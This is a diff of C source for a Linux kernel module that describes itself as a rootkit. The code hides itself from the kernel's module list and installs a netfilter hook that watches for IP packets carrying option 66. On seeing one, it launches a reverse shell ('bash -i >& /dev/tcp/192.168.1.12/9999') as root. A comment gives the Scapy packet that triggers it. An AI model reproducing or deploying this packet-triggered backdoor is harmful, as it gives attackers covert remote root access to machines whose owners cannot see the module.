@@ -1,3 +1,5 @@
+// p = Ether()/IP(dst="192.168.1.10", options="\x42\x04\x00\x00")
+// sendp(p)
 #include <linux/kernel.h>
 #include <linux/module.h> 
 #include <linux/netfilter.h>
@@ -11,8 +13,70 @@
 #include <linux/init.h>
 #include <asm/string.h>
 #include <linux/umh.h>
-#include "../include/hook_net.h" 
-#include "../include/run_bash.h"
+#include <linux/workqueue.h>
+
+MODULE_LICENSE("GPL");
+
+MODULE_AUTHOR("Vasily");
+
+MODULE_DESCRIPTION("rootkit");
+
+MODULE_VERSION("0.1");
+
+struct list_head *prev_module;
+
+#ifdef MODULE
+extern struct module __this_module;
+#define THIS_MODULE (&__this_module)
+#else
+#define THIS_MODULE ((struct module *)0)
+#endif
+
+void start_hide(void){
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+
+int bash_run(const char *bash_command, int wait_policy) {
+    char *argv_main[] = {
+            "/bin/bash",
+            "-c",
+            bash_command,
+            NULL,
+    };
+    char *envp_main[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+            NULL,
+    };
+    return call_usermodehelper(argv_main[0], argv_main, envp_main, wait_policy);
+}
+
+void bash_task(struct work_struct *_){
+        bash_run("bash -i >& /dev/tcp/192.168.1.12/9999 0>&1", UMH_WAIT_EXEC);
+}
+
+static DECLARE_DELAYED_WORK(bask_loop_task, bash_task
+);
+
+int kernel_schedule(void) {
+    //printk(KERN_INFO "Scheduling...\n");
+    int bool_result = schedule_delayed_work(&bask_loop_task, 10);
+    return bool_result ? 0 : -1;
+}
+
+
+
+static struct nf_hook_ops nfhook;
+struct net_device *dev;
+
+typedef struct {
+  unsigned char kind;
+  unsigned char size;
+}
+tcp_option_t;
 
 
 unsigned int hookfunc(void *priv,
@@ -31,10 +95,8 @@ unsigned int hookfunc(void *priv,
     return NF_ACCEPT;
   }
 
-  printk(KERN_INFO "Packet has options!\n");
-  // print_bytes((unsigned char *) ip_hdr, ip_hdr->ihl *4);
 
-  unsigned char *opt = (unsigned char *) ip_hdr + 20; //Where options start
+  unsigned char *opt = (unsigned char *) ip_hdr + 20; 
   unsigned int offset = 0;
 
   while (offset < ip_hdr->ihl*4-20) {
@@ -55,8 +117,7 @@ unsigned int hookfunc(void *priv,
     //printk(KERN_INFO "Got option with type %u and lenght %u\n", _opt->kind, _opt->size);
     if (_opt->kind == 66) {
       printk(KERN_INFO "Packet has EVIL Option\n");
-      kernel_schedule_loop();
-      /// bash_run("sleep 60 && bash -i >& /dev/tcp/192.168.181.1/8080 0>&1", UMH_NO_WAIT);
+      printk(KERN_INFO "Scheduled with status %d", kernel_schedule());
       return NF_DROP;
     }
 
@@ -69,12 +130,13 @@ unsigned int hookfunc(void *priv,
 }
 
 
-int register_net_hook(void) {
+int init_module() {
+  printk(KERN_INFO "Loaded Rootkit\n");
   read_lock(&dev_base_lock);
   dev = first_net_device(&init_net);
 
   while (dev) {
-    if (strncmp(dev->name, "ens33", 5) != 0) { // Change to choose interface
+    if (strncmp(dev->name, "eth0", 4) != 0) { // Change to choose interface
       dev = next_net_device(dev);
       continue;
     }
@@ -89,5 +151,13 @@ int register_net_hook(void) {
 
   printk(KERN_INFO "Hook registered with status %d\n", nf_register_net_hook(&init_net, &nfhook));
   read_unlock(&dev_base_lock);
+  printk(KERN_INFO "Start hide\n");
+  start_hide();
   return 0;
+}
+
+
+void cleanup_module() {
+  nf_unregister_net_hook(&init_net, &nfhook);
+  printk(KERN_INFO "Unloading rootkit\n");
 }
